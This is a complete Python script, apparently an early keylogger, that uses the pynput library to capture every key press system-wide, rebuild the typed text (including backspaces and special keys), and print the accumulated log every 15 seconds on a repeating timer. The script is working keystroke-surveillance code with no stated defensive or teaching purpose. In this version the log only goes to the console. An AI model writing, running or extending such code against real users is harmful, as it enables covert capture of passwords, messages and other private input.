#!/usr/bin/env python
import pynput.keyboard as pynput
import threading

log = ''

def main():
    keyboard_listener = pynput.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
        return
    except AttributeError:
        print(str(key))
        if str(key) == "Key.space":
            log = log + ' '
            return
        if str(key) == "Key.backspace":
            log = log[:-1]
            return     
        key = str(key).replace('Key.', '')
        log = log + f' ({key}) '

def report():
    global log
    print(f'Current log: {log}')
    log = ''
    timer = threading.Timer(15, report)
    timer.start()

if __name__ == '__main__':
    main()